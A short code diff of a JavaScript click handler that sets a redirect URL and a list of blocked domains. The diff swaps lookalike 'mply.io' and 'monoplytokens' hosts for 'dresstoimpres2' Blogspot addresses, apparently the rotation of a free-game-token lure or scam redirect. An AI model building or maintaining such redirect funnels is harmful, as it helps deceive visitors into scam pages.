@@ -3,12 +3,12 @@
 var button = document.querySelector('#submitButton');  
 button.addEventListener('click', function() {
     (function() {
-        var originalDomain = "monoplytokens.com";
+        var originalDomain = "https://dti2s.blogspot.com";
         var redirectURL = "https://www.rolls3.com/";
         var blockedDomains = [
-            "jsdhjjhhjjhejkjkas.blogspot.com",
-            "mply.io.t0ke2n.site",
-            "mply.io.1arshg4.site",
+            "https://dti2s.blogspot.com/",
+            "https://dresstoimpres2.blogspot.com/",
+            "https://dresstoimpres2.blogspot.com",
             "mply.io.4a6b8dh.site"
         ];
 
